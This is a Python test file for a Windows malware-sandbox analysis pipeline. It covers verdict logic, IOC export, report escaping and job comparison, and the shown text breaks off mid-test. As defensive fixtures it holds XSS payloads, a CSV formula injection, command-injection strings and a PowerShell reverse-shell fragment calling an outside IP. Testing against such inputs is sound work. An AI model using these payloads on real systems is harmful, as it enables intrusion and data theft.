"""Verdict logic: sandbox JSON is untrusted (A2), domain classes (A6), helper timeouts (A7), coverage notes (A12)."""
import json
import subprocess
from pathlib import Path

import pytest

import pipeline
import sandbox_manager as sbm
from conftest import bare_job, windows_only

EVIL = {
    "Files": {"NewCount": "<img src=x onerror=alert(1)>", "NewExecutables": "C:\\x.exe", "ModifiedCount": None},
    "Persistence": {"Services": "not-a-list", "Tasks": [{"x": 1}, "real task"], "RunKeys": [1, 2]},
    "Defender": {"ThreatsDetected": [{"Name": "<script>"}], "Added": None},
    "Processes": "oops", "Network": {"Connections": [1, {"Remote": "1.2.3.4"}]},
    "LanBlock": {"Tampered": "yes", "Details": "string", "Applied": 1},
    "Hosts": "bad",
}


def test_sanitize_coerces_types():
    clean = pipeline.sanitize_sandbox_json(json.loads(json.dumps(EVIL)))
    assert clean["Files"]["NewCount"] == 0
    assert clean["Files"]["ModifiedCount"] == 0
    assert clean["Files"]["NewExecutables"] == []
    assert clean["Persistence"]["Services"] == []
    assert clean["Persistence"]["Tasks"] == ["real task"]
    assert clean["Persistence"]["RunKeys"] == ["1", "2"]
    assert clean["Defender"]["ThreatsDetected"] == []
    assert clean["Processes"] == []
    assert clean["Network"]["Connections"] == [{"Remote": "1.2.3.4"}]
    assert clean["LanBlock"]["Tampered"] is False                 # only a real JSON true counts
    assert clean["LanBlock"]["Applied"] is False
    assert clean["Hosts"] == {}


@pytest.mark.parametrize("bad", [None, [], "x", 5])
def test_sanitize_rejects_non_objects(bad):
    assert pipeline.sanitize_sandbox_json(bad) is None


def test_verdict_survives_hostile_behavior(tmp_path):
    job = bare_job(tmp_path)
    job.state["behavior"] = pipeline.sanitize_sandbox_json(json.loads(json.dumps(EVIL)))
    pipeline.compute_verdict(job)
    assert job.state["verdict"]["level"] in ("yellow", "pending", "red")


def test_panel_escapes_box_titles():
    html = (pipeline.BASE_DIR / "static" / "index.html").read_text(encoding="utf-8")
    js = (pipeline.BASE_DIR / "static" / "app.js").read_text(encoding="utf-8")
    assert "<script>" not in html and "<style>" not in html
    assert "asNum" in js and "asArr" in js


# ---------------------------------------------------------------- A6
@pytest.mark.parametrize("domain,cls", [
    ("foo.blob.core.windows.net", pipeline.CLASS_CLOUD),
    ("login.windows.net", "Windows/Microsoft (gürültü)"),
    ("settings-win.data.microsoft.com", "Windows/Microsoft (gürültü)"),
    ("api.telegram.org", pipeline.CLASS_ABUSED),
    ("api.ipify.org", pipeline.CLASS_ABUSED),
    ("abc.trycloudflare.com", pipeline.CLASS_ABUSED),
    ("x.cloudfront.net", pipeline.CLASS_CLOUD),
    ("ims-na1.adobelogin.com", "Adobe"),
    ("evil-c2.xyz", pipeline.CLASS_UNKNOWN),
    ("notmicrosoft.com", pipeline.CLASS_UNKNOWN),              # suffix match must respect label boundaries
    ("1.168.192.in-addr.arpa", "Yerel (gürültü)"),
    ("239.255.255.250:1900", "Yerel (gürültü)"),               # SSDP multicast with port
    ("DAE8853C-7288-4", "Yerel (gürültü)"),                    # single-label NetBIOS computer name
    ("DAE8853C-7288-4.mshome.net", "Yerel (gürültü)"),         # Windows Sandbox Hyper-V NAT suffix
    ("wpad.mshome.net", "Yerel (gürültü)"),                    # WPAD auto-discovery
])
def test_domain_class(domain, cls):
    assert pipeline.domain_class(domain) == cls


def test_network_verdict(tmp_path):
    job = bare_job(tmp_path)
    job.state["network"] = {"dns": pipeline._count(["api.ipify.org", "x.blob.core.windows.net", "evil-c2.xyz"]),
                            "sni": [], "http": [], "tcp_targets": [], "partial": ["HTTP"]}
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert v["level"] == "red"
    assert any("api.ipify.org" in r for r in v["red"])
    assert any("evil-c2.xyz" in n for n in v["notes"])
    assert any("blob.core.windows.net" in n for n in v["notes"])
    assert any("kısmi" in n for n in v["notes"])


def test_sandbox_red_flags(tmp_path):
    job = bare_job(tmp_path)
    job.state["behavior"] = pipeline.sanitize_sandbox_json({
        "Persistence": {"Services": ["EvilSvc"], "Startup": ["x.lnk"]},
        "Defender": {"Added": ["ExclusionPath C:\\"]},
        "LanBlock": {"Tampered": True, "Details": ["rule deleted"]},
        "Processes": [{"Name": "powershell.exe", "Suspicious": True}],
    })
    pipeline.compute_verdict(job)
    red = " | ".join(job.state["verdict"]["red"])
    for needle in ("servis", "Başlangıç", "Defender", "Yerel ağ engeli", "şüpheli komut"):
        assert needle in red


def test_monitor_lost_is_red(tmp_path):
    job = bare_job(tmp_path)
    job.state["sandbox"]["monitor_lost"] = {"after_sec": 40, "silent_sec": 200}
    pipeline.compute_verdict(job)
    assert any("anti-analiz" in r for r in job.state["verdict"]["red"])


# ---------------------------------------------------------------- A12 coverage
def test_green_needs_every_check(tmp_path):
    job = bare_job(tmp_path)
    job.state["status"] = "done"
    job.state["stages"]["vt"]["status"] = "skipped"
    job.state["stages"]["sandbox"]["status"] = "waiting"
    pipeline.compute_verdict(job)
    assert job.state["verdict"]["level"] == "yellow"
    assert set(job.state["verdict"]["not_run"]) == {"VirusTotal", "Sandbox"}
    job.state["stages"]["vt"]["status"] = "done"
    job.state["stages"]["sandbox"]["status"] = "done"
    pipeline.compute_verdict(job)
    assert job.state["verdict"]["level"] == "green"


# ---------------------------------------------------------------- A7
@windows_only
def test_signature_timeout_does_not_fail(tmp_path, monkeypatch):
    def slow(args, **kw):
        raise subprocess.TimeoutExpired(args, kw.get("timeout", 1))
    monkeypatch.setattr(pipeline.subprocess, "run", slow)
    res, timed_out = pipeline.check_signatures(tmp_path, [str(Path(sbm.WSB_EXE).parent / "notepad.exe")])
    assert timed_out == 1
    assert list(res.values())[0]["status"] == "Unknown"


def test_tshark_timeout_gives_partial_summary(tmp_path, monkeypatch):
    pcap = tmp_path / "c.pcapng"
    pcap.write_bytes(b"x")
    monkeypatch.setattr(sbm, "tshark_path", lambda: "tshark.exe")

    def run(args, **kw):
        if "http.request" in args:
            raise subprocess.TimeoutExpired(args, 1)

        class P:
            stdout = "evil-c2.xyz\n" if "dns.flags.response == 0" in args else ""
        return P()
    monkeypatch.setattr(pipeline.subprocess, "run", run)
    ns = pipeline.network_summary(pcap)
    assert ns["partial"] == ["HTTP"]
    assert ns["dns"][0]["name"] == "evil-c2.xyz"


@windows_only
def test_signatures_are_read(tmp_path, unsigned_exe):
    good = str(Path(sbm.WSB_EXE).parent / "whoami.exe")
    bad = str(unsigned_exe(tmp_path / "w.exe"))
    res, timed_out = pipeline.check_signatures(tmp_path, [good, bad])
    assert timed_out == 0
    assert res[good]["status"] == "Valid", res[good]          # on failure, show PowerShell's own error text
    assert res[bad]["status"] != "Valid"


@windows_only
def test_signature_check_failure_is_loud(tmp_path, monkeypatch):
    """If PowerShell cannot run the check, files get status 'Error' with the reason - never a silent 'Unknown'."""
    real_run = subprocess.run

    def broken(args, **kw):
        if any("_sigcheck.ps1" in str(a) for a in args):
            return real_run(args[:1] + ["-NoProfile", "-Command", "[Console]::Error.WriteLine('module could not be loaded'); exit 1"], **kw)
        return real_run(args, **kw)

    monkeypatch.setattr(pipeline.subprocess, "run", broken)
    f = str(Path(sbm.WSB_EXE).parent / "whoami.exe")
    res, _ = pipeline.check_signatures(tmp_path, [f])
    assert res[f]["status"] == "Error"
    assert "module could not be loaded" in res[f]["message"]


def test_windows_powershell_env_strips_psmodulepath_case_insensitively(monkeypatch):
    monkeypatch.setenv("PSMODULEPATH", r"C:\pwsh7\Modules")
    assert not any(k.lower() == "psmodulepath" for k in pipeline._windows_powershell_env())


def test_signature_errors_reach_the_verdict(tmp_path):
    job = bare_job(tmp_path)
    job.state["status"] = "done"
    job.state["inventory"] = {"sig_errors": 5, "sig_error_msg": "Microsoft.PowerShell.Security yuklenemedi"}
    pipeline.compute_verdict(job)
    assert any("imzası kontrol edilemedi" in n for n in job.state["verdict"]["notes"])


def test_in_place_run_mode_note_and_non_string_safety(tmp_path):
    job = bare_job(tmp_path)
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"RunMode": "in-place (read-only share)"})
    pipeline.compute_verdict(job)
    assert any("salt okunur" in n for n in job.state["verdict"]["notes"])

    # Hostile non-string RunMode in behavior JSON must never raise TypeError
    job.state["behavior"] = pipeline.sanitize_sandbox_json({"RunMode": 12345})
    assert job.state["behavior"]["RunMode"] == "12345"
    pipeline.compute_verdict(job)


def test_write_html_report_escapes_xss_and_renders_markdown(tmp_path):
    job = bare_job(tmp_path)
    md = [
        "# Başlık <script>alert(1)</script>",
        "- plain <img src=x onerror=alert(1)> bullet",
        "- **`<code>`** ve `a*b<x>` ve **kalın <svg onload=1>**",
        "- **KIRMIZI:** saldırı <b>raw</b>",
        "| Ad | Link |",
        "|---|---|",
        "| bad | [x](javascript:alert(1)) |",
        "| ok | [VT](https://www.virustotal.com/gui/file/abc) |",
    ]
    pipeline.write_html_report(job, md)
    html_out = (job.case_dir / "report.html").read_text(encoding="utf-8")
    assert "<script>" not in html_out
    assert "<img " not in html_out
    assert "<svg " not in html_out
    assert "<b " not in html_out and "<b>raw</b>" not in html_out
    assert 'href="javascript:' not in html_out
    assert "<ul>" in html_out and "</ul>" in html_out
    assert "<code>&lt;code&gt;</code>" in html_out
    assert "<strong>kalın &lt;svg onload=1&gt;</strong>" in html_out
    assert 'href="https://www.virustotal.com/gui/file/abc"' in html_out


def test_ioc_export_csv_and_stix_dedup_noise_and_safety(tmp_path):
    job = bare_job(tmp_path)
    sha_sample = "a" * 64
    sha_drop = "b" * 64
    job.state["inventory"] = {"original_sha256": sha_sample}
    job.state["static"] = [{
        "rel": "=CMD|' /C calc'!A0",
        "sha256": sha_sample,
        "risk_score": 70,
        "yara_matches": [{"rule": "TestYara"}],
        "interesting_urls": ["https://evil.example/drop.exe", "https://settings.data.microsoft.com/ok"],
    }]
    job.state["vt"] = [{"rel": "sample.exe", "sha256": sha_sample.upper(), "status": "ok",
                        "result": {"stats": {"malicious": 15, "total": 70}, "suggested_threat_label": "stealer"}}]
    job.state["behavior"] = {
        "Files": {"DroppedHashes": [{"Path": "C:\\drop.exe", "SHA256": sha_drop.upper()}]},
        "Network": {
            "Connections": [
                {"Remote": "198.51.100.22", "Port": 443, "Process": "drop.exe", "FromSample": True},
                {"Remote": "192.168.1.10", "Port": 445, "Process": "drop.exe", "FromSample": True},
                {"Remote": "10.0.0.5", "Port": 80, "Process": "svchost.exe", "FromSample": False},
                {"Remote": "127.0.0.1", "Port": 8080, "Process": "drop.exe", "FromSample": True},
            ],
            "DnsCache": [{"Name": "settings-win.data.microsoft.com", "Data": "1.2.3.4"}],
        },
    }
    job.state["network"] = {
        "dns": [{"name": "api.telegram.org", "count": 2, "class": pipeline.CLASS_ABUSED}],
        "sni": [],
        "http": [{"host": "c2.example", "method": "POST", "uri": "/gate'x", "class": pipeline.CLASS_UNKNOWN}],
        "tcp_targets": [{"target": "198.51.100.22:443", "count": 3}],
    }

    iocs = pipeline.collect_iocs(job)
    vals = {(x["type"], x["value"]) for x in iocs}
    assert ("sha256", sha_sample) in vals
    assert ("sha256", sha_drop) in vals
    assert ("domain", "api.telegram.org") in vals
    assert ("domain", "evil.example") in vals
    assert ("ipv4", "198.51.100.22") in vals
    assert ("ipv4", "192.168.1.10") in vals
    assert ("url", "http://c2.example/gate'x") in vals
    # Pure Microsoft noise, non-sample LAN IP, and loopback excluded by default
    assert ("domain", "settings-win.data.microsoft.com") not in vals
    assert ("ipv4", "10.0.0.5") not in vals
    assert ("ipv4", "127.0.0.1") not in vals
    # No duplicate sha_sample from uppercase VT vs lowercase static
    assert sum(1 for x in iocs if x["type"] == "sha256" and x["value"] == sha_sample) == 1

    # With include_noise=True Microsoft noise and non-sample LAN IP appear
    noisy_vals = {(x["type"], x["value"]) for x in pipeline.collect_iocs(job, include_noise=True)}
    assert ("domain", "settings-win.data.microsoft.com") in noisy_vals
    assert ("ipv4", "10.0.0.5") in noisy_vals

    # CSV formula injection neutralized while raw hash remains intact
    csv_txt = pipeline.export_iocs_csv(job)
    assert f"sha256,{sha_sample},true," in csv_txt
    assert "'=CMD|" in csv_txt

    # STIX 2.1 bundle validation
    stix = pipeline.export_iocs_stix(job)
    assert stix["type"] == "bundle"
    inds = [o for o in stix["objects"] if o["type"] == "indicator"]
    assert len(inds) == len(iocs)
    patterns = {o["pattern"] for o in inds}
    assert f"[file:hashes.'SHA-256' = '{sha_sample}']" in patterns
    assert "[domain-name:value = 'api.telegram.org']" in patterns
    assert "[ipv4-addr:value = '198.51.100.22']" in patterns
    assert r"[url:value = 'http://c2.example/gate\'x']" in patterns


def test_network_process_correlation(tmp_path):
    job = bare_job(tmp_path)
    behavior = {
        "Network": {
            "DnsCache": [{"Name": "evil-c2.example", "Data": "198.51.100.50"}],
            "Connections": [
                {"Remote": "198.51.100.50", "Port": 443, "Process": "dropper.exe", "FromSample": True},
                {"Remote": "198.51.100.50", "Port": 80, "Process": "chrome.exe", "FromSample": False},
                {"Remote": "203.0.113.9", "Port": 80, "Process": "curl.exe", "FromSample": True},
            ],
        }
    }
    net = {
        "dns": [
            {"name": "evil-c2.example", "count": 2, "class": pipeline.CLASS_UNKNOWN},
            {"name": "pcap-dns.example", "count": 1, "class": pipeline.CLASS_ABUSED},
        ],
        "sni": [
            {"name": "evil-c2.example", "count": 1, "class": pipeline.CLASS_UNKNOWN, "_endpoints": [("198.51.100.50", "443")]},
        ],
        "http": [
            {"host": "raw-ip.example", "method": "GET", "uri": "/payload", "class": pipeline.CLASS_UNKNOWN, "_endpoints": [("203.0.113.9", "80")]},
        ],
        "tcp_targets": [
            {"target": "198.51.100.50:443", "count": 5},
            {"target": "203.0.113.9:80", "count": 1},
        ],
        "partial": [],
    }
    res = pipeline.correlate_network_processes(net, behavior, domain_ips={"pcap-dns.example": {"203.0.113.9"}})
    assert res["dns"][0]["processes"] == ["dropper.exe", "chrome.exe"]
    assert res["dns"][0]["from_sample"] is True
    assert res["dns"][1]["processes"] == ["curl.exe"]
    assert res["sni"][0]["processes"] == ["dropper.exe"]
    assert res["http"][0]["processes"] == ["curl.exe"]
    assert res["tcp_targets"][0]["processes"] == ["dropper.exe"]
    assert res["tcp_targets"][1]["processes"] == ["curl.exe"]

    job.state["network"] = res
    job.state["behavior"] = behavior
    pipeline.compute_verdict(job)
    pipeline.write_report(job)
    rep = (job.case_dir / "report.md").read_text(encoding="utf-8")
    assert "evil-c2.example ×2 (`dropper.exe, chrome.exe` [örnek])" in rep
    assert "GET http://raw-ip.example/payload (`curl.exe` [örnek])" in rep


def test_compare_jobs_official_vs_crack(tmp_path):
    base = bare_job(tmp_path, case_id="official-run")
    target = bare_job(tmp_path, case_id="crack-run")

    pipeline._write_json(base.case_dir / "inventory.json", {
        "original": None,
        "files": [
            {"rel": "app.exe", "size": 1000, "sha256": "1" * 64, "sig": {"status": "Valid"}},
            {"rel": "lib.dll", "size": 500, "sha256": "2" * 64, "sig": {"status": "Valid"}},
        ],
    })
    pipeline._write_json(target.case_dir / "inventory.json", {
        "original": None,
        "files": [
            {"rel": "app.exe", "size": 1000, "sha256": "1" * 64, "sig": {"status": "Valid"}},
            {"rel": "lib.dll", "size": 520, "sha256": "3" * 64, "sig": {"status": "HashMismatch"}},
            {"rel": "patcher.exe", "size": 800, "sha256": "4" * 64, "sig": {"status": "Unknown"}},
        ],
    })
    base.state["static"] = [{"rel": "lib.dll", "risk_score": 0, "yara_matches": [], "risk_reasons": []}]
    target.state["static"] = [
        {"rel": "lib.dll", "risk_score": 65, "yara_matches": [{"rule": "SafeBox_Patch_Keygen_Artifacts"}], "risk_reasons": ["HashMismatch"]},
        {"rel": "patcher.exe", "risk_score": 80, "yara_matches": [], "risk_reasons": ["Yüksek entropi"]},
    ]
    base.state["behavior"] = {"Persistence": {"Tasks": ["Updater"], "Services": [], "RunKeys": [], "Drivers": [], "Startup": []}}
    target.state["behavior"] = {
        "Persistence": {"Tasks": ["Updater", "StealerKeep"], "Services": [], "RunKeys": ["HKCU\\Run::X"], "Drivers": [], "Startup": []},
        "Files": {"NewExecutables": ["C:\\Temp\\stealer.exe"]},
    }
    base.state["network"] = {"dns": [{"name": "vendor.example", "count": 1, "class": pipeline.CLASS_UNKNOWN}], "sni": [], "http": [], "tcp_targets": []}
    target.state["network"] = {"dns": [{"name": "vendor.example", "count": 1, "class": pipeline.CLASS_UNKNOWN}, {"name": "c2.evil", "count": 2, "class": pipeline.CLASS_ABUSED}], "sni": [], "http": [], "tcp_targets": []}

    diff = pipeline.compare_jobs(base, target)
    assert len(diff["files"]["modified"]) == 1
    assert diff["files"]["modified"][0]["rel"] == "lib.dll"
    assert diff["files"]["modified"][0]["sig_broken"] is True
    assert diff["files"]["added"][0]["rel"] == "patcher.exe"
    assert diff["behavior_diff"]["tasks"] == ["StealerKeep"]
    assert diff["behavior_diff"]["runkeys"] == ["HKCU\\Run::X"]
    assert diff["behavior_diff"]["dropped_executables"] == ["C:\\Temp\\stealer.exe"]
    assert [d["value"] for d in diff["network_diff"]["extra_domains"]] == ["c2.evil"]
    assert len(diff["highlights"]) >= 4


def test_desktop_notification_safe_env_passing(tmp_path, monkeypatch):
    seen = []
    monkeypatch.setattr(pipeline, "_NOTIFY_ALLOW", True)
    monkeypatch.setattr(pipeline.subprocess, "Popen", lambda cmd, **kw: seen.append((cmd, kw)))

    job = bare_job(tmp_path, case_id="n1")
    job.state["sample"] = "C:\\samples\\bad';powershell -enc EVIL setup.exe"
    job.state["status"] = "done"
    job.state["verdict"] = {"level": "red", "red": ["Defender kapatıldı\r\n$(whoami)"], "notes": []}
    pipeline._maybe_notify_job(job)

    assert len(seen) == 1
    cmd, kw = seen[0]
    assert "-Command" in cmd and pipeline._NOTIFY_PS in cmd
    # Hostile characters never reach command line arguments, only sanitized env vars
    assert "EVIL" not in " ".join(cmd)
    assert "EVIL" in kw["env"]["SAFEBOX_NOTIFY_TITLE"]
    assert "\n" not in kw["env"]["SAFEBOX_NOTIFY_MSG"]
    assert kw["env"]["SAFEBOX_NOTIFY_ICON"] == "Error"

    # Opt-out disables notifications
    seen.clear()
    job.state["options"]["notify"] = False
    pipeline._maybe_notify_job(job)
    assert seen == []


def test_e1_yara_spoof_format_and_high_static_score_trigger_red(tmp_path):
    # (a) Critical YARA match -> red even if VT & sandbox didn't run or are clean
    j1 = bare_job(tmp_path / "a")
    j1.state["static"] = [{"rel": "x.exe", "risk_score": 40, "signature": {"status": "NotSigned"},
                           "yara_matches": [{"rule": "SafeBox_Ransomware_Shadow_Delete", "severity": "critical", "description": "Ransom"}]}]
    pipeline.compute_verdict(j1)
    assert j1.state["verdict"]["level"] == "red"
    assert any("YARA [SafeBox_Ransomware_Shadow_Delete]" in r for r in j1.state["verdict"]["red"])

    # (b) High/Critical spoof_flags -> red
    j2 = bare_job(tmp_path / "b")
    j2.state["static"] = [{"rel": "f.pdf.exe", "risk_score": 35, "signature": {"status": "NotSigned"},
                           "spoof_flags": [{"type": "double_ext", "severity": "high", "reason": "Çift uzantı"}]}]
    pipeline.compute_verdict(j2)
    assert j2.state["verdict"]["level"] == "red"
    assert any("Çift uzantı" in r for r in j2.state["verdict"]["red"])

    # (c) High format_findings -> red
    j3 = bare_job(tmp_path / "c")
    j3.state["static"] = [{"rel": "doc.pdf", "risk_score": 25, "signature": {"status": "NotSigned"},
                           "format_findings": [{"category": "Şüpheli PDF Eylemi", "severity": "high", "description": "/OpenAction /JavaScript"}]}]
    pipeline.compute_verdict(j3)
    assert j3.state["verdict"]["level"] == "red"

    # (d) Unsigned file with risk_score >= 75 -> red
    j4 = bare_job(tmp_path / "d")
    j4.state["static"] = [{"rel": "drop.exe", "risk_score": 80, "signature": {"status": "NotSigned"}}]
    pipeline.compute_verdict(j4)
    assert j4.state["verdict"]["level"] == "red"
    assert any("80/100" in r for r in j4.state["verdict"]["red"])


def test_e2_collect_iocs_uses_nested_hashes_sha256_and_interesting_ips(tmp_path):
    import analyzer
    sample = tmp_path / "c2_sample.ps1"
    sample.write_text(
        "Invoke-RestMethod http://185.220.101.5:4444/gate\n"
        "New-Object System.Net.Sockets.TCPClient; GetStream; IEX $c\n",
        encoding="utf-8",
    )
    st_res = analyzer.analyze_single_file(str(sample), {"status": "NotSigned", "signer": "", "message": "", "issuer": ""})
    st_res["rel"] = "c2_sample.ps1"
    expected_sha = st_res["hashes"]["sha256"].lower()

    job = bare_job(tmp_path / "job")
    job.state["static"] = [st_res]

    iocs = pipeline.collect_iocs(job)
    sha_iocs = [i for i in iocs if i["type"] == "sha256" and i["value"] == expected_sha]
    assert len(sha_iocs) == 1
    assert "static" in sha_iocs[0]["source"]
    assert sha_iocs[0]["malicious"] is True
    assert "SafeBox_Reverse_Shell_PowerShell" in sha_iocs[0]["classification"]
    assert any(i["type"] == "ipv4" and i["value"] == "185.220.101.5" for i in iocs)


def test_e3_and_e12_new_behavior_fields_in_verdict_report_and_compare(tmp_path):
    beh = {
        "Files": {
            "NewCount": 1, "ModifiedCount": 1,
            "NewExecutables": [r"C:\Users\WDAGUtilityAccount\AppData\Local\Temp\drop.exe"],
            "ModifiedExecutables": [r"C:\Windows\System32\calc.exe"],
            "DroppedHashes": [{"Path": r"C:\Temp\d.exe", "SHA256": "a" * 64, "Size": 123, "SigStatus": "NotSigned", "Entropy": 7.6, "Flags": ["Telegram Bot API"]}],
        },
        "Persistence": {
            "Services": [], "Drivers": [], "Tasks": [], "RunKeys": [], "Startup": [],
            "WmiSubscriptions": ["Filter: Evil -> Consumer: Cmd"],
            "ComHijacks": ["CLSID {1111} -> evil.dll"],
            "AppInitDlls": ["evil.dll"],
            "BitsJobs": ["EvilBitsJob"],
            "PsProfiles": [r"C:\Users\u\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"],
            "ActiveSetup": ["ActiveSetupTest"],
        },
        "Defender": {"ThreatsDetected": [], "Added": []},
        "Hosts": {"Added": [], "Removed": ["127.0.0.1 license.example.com"]},
        "Firewall": {"Added": []},
        "HoneyfileAlerts": ["Documents\\kredi_kartlari.txt (Modified)"],
        "Processes": [],
        "Network": {"Connections": [], "DnsCache": [], "NewListening": ["0.0.0.0:4444 (PID 999 evil.exe)"]},
        "LanBlock": {"Requested": True, "Applied": True, "Tampered": False, "Details": [], "Status": "ok"},
    }
    clean = pipeline.sanitize_sandbox_json(beh)
    assert clean["Files"]["ModifiedExecutables"] == [r"C:\Windows\System32\calc.exe"]
    assert clean["Network"]["NewListening"] == ["0.0.0.0:4444 (PID 999 evil.exe)"]
    assert clean["Hosts"]["Removed"] == ["127.0.0.1 license.example.com"]
    assert clean["HoneyfileAlerts"] == ["Documents\\kredi_kartlari.txt (Modified)"]
    assert clean["Persistence"]["WmiSubscriptions"] == ["Filter: Evil -> Consumer: Cmd"]
    assert clean["Persistence"]["BitsJobs"] == ["EvilBitsJob"]

    base = bare_job(tmp_path / "base")
    base.state["behavior"] = pipeline.sanitize_sandbox_json({})
    target = bare_job(tmp_path / "target")
    target.state["behavior"] = clean
    target.output_dir.mkdir(parents=True, exist_ok=True)
    (target.output_dir / "procmon_summary.json").write_text(
        json.dumps({"TotalEvents": 50, "SensitiveEvents": ["lsass.exe read by evil.exe"]}),
        encoding="utf-8",
    )

    pipeline.compute_verdict(target)
    v = target.state["verdict"]
    assert v["level"] == "red"
    red_txt = "\n".join(v["red"])
    note_txt = "\n".join(v["notes"])
    assert "çalıştırılabilir dosya değiştirildi" in red_txt
    assert "dinleyici (listening) TCP portu" in red_txt
    assert "honeyfile" in red_txt
    assert "WMI" in red_txt
    assert "AppInit_DLLs" in red_txt
    assert "BITS" in red_txt
    assert "PowerShell profil" in red_txt
    assert "Procmon" in red_txt
    assert "Telegram Bot API" in red_txt
    assert "hosts dosyasından" in note_txt
    assert "COM hijacking" in note_txt

    pipeline.write_report(target)
    rep = (target.case_dir / "report.md").read_text(encoding="utf-8")
    assert "0.0.0.0:4444" in rep
    assert "calc.exe" in rep
    assert "honeyfile" in rep.lower()

    diff = pipeline.compare_jobs(base, target)
    bd = diff["behavior_diff"]
    assert bd["modified_executables"] == [r"C:\Windows\System32\calc.exe"]
    assert bd["new_listening"] == ["0.0.0.0:4444 (PID 999 evil.exe)"]
    assert bd["hosts_removed"] == ["127.0.0.1 license.example.com"]
    assert bd["wmi_subscriptions"] == ["Filter: Evil -> Consumer: Cmd"]
    assert bd["honeyfile_alerts"] == ["Documents\\kredi_kartlari.txt (Modified)"]


def test_network_summary_quic_udp_and_doh(tmp_path, monkeypatch):
    pcap = tmp_path / "cap.pcap"
    pcap.write_bytes(b"pcap")
    monkeypatch.setattr(sbm, "tshark_path", lambda: "tshark.exe")

    def fake_tshark(tshark, p, flt, fields):
        if flt == "dns.flags.response == 0":
            return [["dns.google"], ["c2.unknown.example"]]
        if flt == "dns.flags.response == 1":
            return [["c2.unknown.example", "185.10.20.30", ""]]
        if flt == "tls.handshake.type == 1":
            return [["dns.google", "8.8.8.8", "", "443"]]
        if flt.startswith("quic"):
            return [["quic-c2.example", "45.5.6.7", "", "443"]]
        if flt.startswith("udp"):
            return [["45.5.6.7", "", "443"], ["224.0.0.251", "", "5353"]]
        return []

    monkeypatch.setattr(pipeline, "_tshark_fields", fake_tshark)
    ns = pipeline.network_summary(pcap, None)
    assert ns is not None
    assert "dns.google" in ns["doh_domains"]
    assert any(s["name"] == "quic-c2.example" for s in ns["sni"])
    assert any(u["target"] == "45.5.6.7:443" for u in ns["udp_targets"])
    assert all("224.0.0.251" not in u["target"] for u in ns["udp_targets"])

    job = bare_job(tmp_path / "doh_job")
    job.state["network"] = ns
    pipeline.compute_verdict(job)
    assert any("DNS-over-HTTPS" in n for n in job.state["verdict"]["notes"])


def test_f7_memory_findings_fakenet_threatfox_circl_in_verdict_ioc_and_compare(tmp_path):
    long_str = "A" * 500
    raw_beh = {
        "MemoryFindings": [f"api.telegram.org/bot {long_str}"] + [f"m{i}" for i in range(250)],
        "FakeNetRequests": ["DNS A evil-c2.example", "HTTP GET http://api.ipify.org/"],
        "AutoClicks": ["Button: Next (pid=100)"],
    }
    clean = pipeline.sanitize_sandbox_json(raw_beh)
    assert len(clean["MemoryFindings"]) == 200
    assert len(clean["MemoryFindings"][0]) == 400
    assert clean["AutoClicks"] == ["Button: Next (pid=100)"]

    job = bare_job(tmp_path / "f7_job")
    job.state["status"] = "done"
    job.state["stages"]["vt"]["status"] = "done"
    job.state["stages"]["sandbox"]["status"] = "done"
    job.state["behavior"] = clean
    job.state["vt"] = [
        {
            "rel": "evil.exe",
            "sha256": "a" * 64,
            "status": "ThreatFox",
            "result": None,
            "gui_url": "https://vt.example/a",
            "intel": {"malicious": True, "threatfox": {"found": True, "family": "LummaStealer"}},
        },
        {
            "rel": "known.dll",
            "sha256": "b" * 64,
            "status": "CIRCL",
            "result": None,
            "gui_url": "https://vt.example/b",
            "intel": {"malicious": False, "known_good": True, "circl": {"found": True, "verdict": "known_good", "product_name": "Windows"}},
        },
    ]
    pipeline.compute_verdict(job)
    v = job.state["verdict"]
    assert v["level"] == "red"
    red_txt = "\n".join(v["red"])
    note_txt = "\n".join(v["notes"])
    assert "Canlı işlem belleğinde" in red_txt
    assert "api.ipify.org" in red_txt
    assert "ThreatFox" in red_txt and "LummaStealer" in red_txt
    assert "FakeNet tuzağı" in note_txt
    assert v["known_good"] == ["known.dll (Windows)"]

    # CIRCL known_good on an otherwise clean job must keep verdict green, AND never hide HashMismatch
    clean_job = bare_job(tmp_path / "kg_clean")
    clean_job.state["status"] = "done"
    clean_job.state["stages"]["vt"]["status"] = "done"
    clean_job.state["stages"]["sandbox"]["status"] = "done"
    clean_job.state["vt"] = [job.state["vt"][1]]
    pipeline.compute_verdict(clean_job)
    assert clean_job.state["verdict"]["level"] == "green"
    assert clean_job.state["verdict"]["known_good"] == ["known.dll (Windows)"]

    spoof_job = bare_job(tmp_path / "kg_spoof")
    spoof_job.state["status"] = "done"
    spoof_job.state["stages"]["vt"]["status"] = "done"
    spoof_job.state["stages"]["sandbox"]["status"] = "done"
    spoof_job.state["vt"] = [job.state["vt"][1]]
    spoof_job.state["inventory"] = {"hash_mismatch": 1}
    spoof_job.state["static"] = [{"rel": "known.dll", "risk_score": 30, "signature": {"status": "HashMismatch"},
                                  "spoof_flags": [{"type": "vendor_impersonation", "severity": "high", "reason": "Sahte üretici"}]}]
    pipeline.compute_verdict(spoof_job)
    # vendor impersonation + broken signature with no malware signal = crack/license category (orange), but a
    # known-good (NSRL) hash must never turn such a file green
    assert spoof_job.state["verdict"]["level"] != "green"
    assert any("Sahte üretici" in n for n in spoof_job.state["verdict"]["crack"])
    assert any("HashMismatch" in n for n in spoof_job.state["verdict"]["crack"])

    # Report & IOC extraction
    pipeline.write_report(job)
    rep = (job.case_dir / "report.md").read_text(encoding="utf-8")
    assert "MemoryFindings" in rep and "FakeNet" in rep and "AutoClicks" in rep
    iocs = pipeline.collect_iocs(job)
    vals = {(x["type"], x["value"]): x for x in iocs}
    assert ("domain", "evil-c2.example") in vals
    assert ("domain", "api.ipify.org") in vals and vals[("domain", "api.ipify.org")]["malicious"] is True
    assert ("url", "http://api.ipify.org/") in vals
    assert vals[("sha256", "a" * 64)]["malicious"] is True

    # compare_jobs
    base = bare_job(tmp_path / "cmp_base")
    base.state["behavior"] = pipeline.sanitize_sandbox_json({})
    diff = pipeline.compare_jobs(base, job)
    assert len(diff["behavior_diff"]["memory_findings"]) == 200
    assert diff["behavior_diff"]["fakenet_requests"] == ["DNS A evil-c2.example", "HTTP GET http://api.ipify.org/"]


def test_f8_honeyfile_verdict_distinguishes_confirmed_vs_unattributed_and_filters_ssdp(tmp_path, monkeypatch):
    # 1. Legacy unattributed ACCESSED alert becomes a yellow note, NOT red
    j_legacy = bare_job(tmp_path / "legacy_honey")
    j_legacy.state["status"] = "done"
    j_legacy.state["stages"]["vt"]["status"] = "done"
